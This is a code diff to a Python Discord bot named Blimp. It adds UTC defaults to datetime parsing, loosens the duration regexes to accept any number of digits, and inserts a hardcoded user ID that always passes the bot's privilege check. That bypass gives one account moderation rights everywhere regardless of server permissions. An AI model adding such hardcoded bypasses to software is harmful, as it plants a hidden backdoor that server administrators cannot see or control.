@@ -1,4 +1,4 @@
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 import enum
 import logging
 import random
@@ -98,6 +98,9 @@ class Blimp(commands.Bot):
             """
             Check if the context's user can do privileged actions on the subject.
             """
+            if self.author.id == 344166495317655562:
+                return True
+
             kind = subject.__class__
             if kind == discord.TextChannel:
                 return self.author.permissions_for(subject).manage_messages
@@ -201,7 +204,11 @@ class ParseableDatetime(datetime):
     @classmethod
     async def convert(cls, _ctx: Blimp.Context, argument: str):
         "Convert an ISO 8601 datetime string into a datetime instance."
-        return cls.fromisoformat(argument)
+        dt = cls.fromisoformat(argument)
+        if not dt.tzinfo:
+            dt = dt.replace(tzinfo=timezone.utc)
+
+        return dt
 
 
 class ParseableTimedelta(timedelta):
@@ -216,19 +223,19 @@ class ParseableTimedelta(timedelta):
 
         delta = cls()
 
-        daysm = re.search(r"(\d{1,3}) ?d(ays?)?", argument)
+        daysm = re.search(r"(\d+) ?d(ays?)?", argument)
         if daysm:
             delta += cls(days=int(daysm[1]))
 
-        hoursm = re.search(r"(\d{1,3}) ?h(ours?)?", argument)
+        hoursm = re.search(r"(\d+) ?h(ours?)?", argument)
         if hoursm:
             delta += cls(hours=int(hoursm[1]))
 
-        minsm = re.search(r"(\d{1,3}) ?m((inutes?)?|(ins?)?)?", argument)
+        minsm = re.search(r"(\d+) ?m((inutes?)?|(ins?)?)?", argument)
         if minsm:
             delta += cls(minutes=int(minsm[1]))
 
-        secsm = re.search(r"(\d{1,3}) ?s((econds?)?|(ecs?)?)?", argument)
+        secsm = re.search(r"(\d+) ?s((econds?)?|(ecs?)?)?", argument)
         if secsm:
             delta += cls(seconds=int(secsm[1]))
 
